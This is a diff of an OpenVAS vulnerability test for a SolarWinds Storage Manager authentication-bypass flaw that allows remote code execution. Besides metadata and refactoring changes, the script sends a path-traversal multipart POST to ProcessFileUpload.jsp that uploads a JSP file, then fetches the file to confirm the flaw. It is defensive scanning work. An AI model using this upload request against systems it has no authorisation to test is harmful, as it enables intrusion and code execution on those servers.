@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_solarwinds_storage_manager_authentication_bypass_09_14.nasl 13659 2019-02-14 08:34:21Z cfischer $
+# $Id: gb_solarwinds_storage_manager_authentication_bypass_09_14.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # SolarWinds Storage Manager AuthenticationFilter Remote Code Execution Vulnerability
 #
@@ -30,7 +30,7 @@ if(description)
   script_oid("1.3.6.1.4.1.25623.1.0.105090");
   script_tag(name:"cvss_base", value:"8.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");
-  script_version("$Revision: 13659 $");
+  script_version("$Revision: 13994 $");
 
   script_name("SolarWinds Storage Manager AuthenticationFilter Remote Code Execution Vulnerability");
   script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-299/");
@@ -50,7 +50,7 @@ in the AuthenticationFilter class.");
 
   script_tag(name:"affected", value:"Storage Manager Server before 5.7.2 is vulnerable.");
 
-  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2014-09-16 15:55:12 +0200 (Tue, 16 Sep 2014)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -70,15 +70,15 @@ include("misc_func.inc");
 
 port = get_http_port( default:9000 );
 buf = http_get_cache( item:"/", port:port );
-
-if( "<title>SolarWinds - Storage Manager" >!< buf ) exit( 0 );
-
-vtstring = get_vt_string();
-rand_str = vtstring + " " + rand();
-file = '_' + vtstring + '_.jsp';
+if(! buf || "<title>SolarWinds - Storage Manager" >!< buf )
+  exit( 0 );
 
 useragent = http_get_user_agent();
 host = http_host_name(port:port);
+
+vtstrings = get_vt_strings();
+rand_str = vtstrings["default_rand"];
+file = '_' + vtstrings["lowercase_rand"] + '_.jsp';
 
 data = '\r\n' +
       '--_Part_316_1523688081_377140406\r\n' +
@@ -102,15 +102,14 @@ req = 'POST /images/../jsp/ProcessFileUpload.jsp HTTP/1.1\r\n' +
       '\r\n' +
       data;
 result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
+if( ! result || "Upload Successful" >!< result )
+  exit( 99 );
 
-if( "Upload Successful" >!< result ) exit( 99 );
-
-url = '/images/../' +file;
+url = '/images/../' + file;
 req = http_get( item:url, port:port );
 buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-if( rand_str >< buf )
-{
+if( rand_str >< buf ) {
   report = 'It was possible to upload the file "' + file + '". Please delete this file.';
   security_message( port:port, data:report );
   exit( 0 );
